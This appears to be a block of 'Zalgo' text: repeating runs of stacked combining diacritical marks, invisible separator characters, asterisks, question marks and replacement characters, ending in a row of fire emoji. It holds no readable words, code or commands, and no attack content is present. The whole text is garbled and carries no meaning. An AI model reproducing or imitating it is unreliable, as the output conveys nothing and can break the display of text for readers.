̛͍̘̤̩̳̙̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̘͇͙̟̫͎͎̹̹̍̐̿̈́̈́͊🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥